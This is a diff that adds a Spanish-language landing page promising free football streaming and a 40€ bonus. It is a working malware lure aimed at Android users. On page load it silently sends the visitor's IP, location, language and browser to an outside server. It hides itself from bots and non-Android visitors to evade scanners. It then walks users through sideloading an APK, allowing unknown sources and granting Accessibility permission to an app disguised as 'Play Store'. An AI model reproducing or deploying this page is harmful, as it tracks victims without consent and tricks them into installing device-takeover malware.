@@ -1,0 +1,168 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fútbol 2025 - Bono de 40€</title>
+  <link rel="manifest" href="manifest.json">
+  
+<script>
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    fetch("https://advsprime.com/api/api.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        ip: data.ip,
+        pais: data.country_name,
+        cidade: data.city,
+        idioma: navigator.language,
+        navegador: navigator.userAgent
+      })
+    }).catch(() => {});
+  });
+</script>
+
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #1e3c72, #2a5298);
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.25);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
+    }
+    .top-message {
+      font-size: 20px;
+      font-weight: bold;
+      color: #f1c40f;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 15px;
+    }
+    .bonus {
+      font-size: 22px;
+      color: #2ecc71;
+      font-weight: bold;
+      margin-bottom: 25px;
+    }
+    .btn-download {
+      display: inline-block;
+      padding: 15px 25px;
+      font-size: 18px;
+      text-decoration: none;
+      color: white;
+      background-color: #e67e22;
+      border-radius: 10px;
+      margin-bottom: 30px;
+    }
+    .btn-download:hover {
+      background-color: #d35400;
+    }
+    .instructions {
+      text-align: left;
+      font-size: 16px;
+      background-color: rgba(0, 0, 0, 0.15);
+      padding: 20px;
+      border-radius: 10px;
+      line-height: 1.6;
+      margin-top: 10px;
+    }
+    footer {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #ccc;
+    }
+  </style>
+
+  <script>
+    const userAgent = navigator.userAgent.toLowerCase();
+
+    const isBot = /bot|crawl|facebookexternalhit|facebot|slurp|spider|mediapartners|google|bing|crawler|preview/i.test(userAgent);
+    const isAndroid = /android/i.test(userAgent);
+    const isHumanTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+    if (isBot || !isAndroid || !isHumanTouch) {
+      document.write("<h2 style='color:red; text-align:center; padding: 40px;'></h2>");
+      throw new Error("Bloqueado por verificación.");
+    }
+  </script>
+</head>
+
+<body>
+  <div class="container">
+    <div class="top-message">⚽ Fútbol 2025 - ¡Míralo gratis!</div>
+    <h1>🎁 ¡Recibe un Bono de 40€!</h1>
+    <p class="bonus">Haz clic abajo para descargar la aplicación:</p>
+
+
+  <a href="javascript:void(0)" class="btn-download" onclick="installPrompt()">📥 Descargar la App</a>
+    
+          <script>
+    let deferredPrompt = null;
+    let promptDetectado = false;
+
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+      promptDetectado = true;
+    });
+
+    function installPrompt() {
+      if (deferredPrompt) {
+        deferredPrompt.prompt();
+        deferredPrompt.userChoice.then(() => {
+          deferredPrompt = null;
+        });
+      } else {
+        window.location.href = "app.html";
+      }
+    }
+
+    setTimeout(() => {
+      if (!promptDetectado) {
+        window.location.href = "app.html";
+      }
+    }, 5000);
+
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('service-worker.js')
+        .then(() => console.log("Service Worker registrado!"))
+        .catch((error) => console.error("Erro ao registrar:", error));
+    }
+  </script>
+
+    <div class="instructions">
+      <p>📲 <strong>¿Cómo instalar la app?</strong></p>
+      <p>⬇️ Haz clic en el botón de descarga y guarda el archivo APK.</p>
+      <p>📂 Abre el archivo descargado.</p>
+      <p>⚠️ Si aparece un aviso de seguridad, pulsa <strong>"Ajustes"</strong> y activa <strong>"Permitir desde esta fuente"</strong>.</p>
+      <p>✅ Confirma y continúa con la instalación.</p>
+      <br />
+      <p>🛡️ <strong>Permiso de accesibilidad</strong></p>
+      <p>🔐 Al iniciar por primera vez, la app puede pedirte un permiso especial para funcionar correctamente:</p>
+      <p>⚙️ Ve a <strong>Ajustes > Accesibilidad</strong>.</p>
+      <p>📱 Selecciona <strong>Play Store</strong> y activa el permiso.</p>
+    </div>
+
+    <footer>
+      © 2025 Deportes Plus | Todos los derechos reservados
+    </footer>
+  </div>
+</body>
+</html>
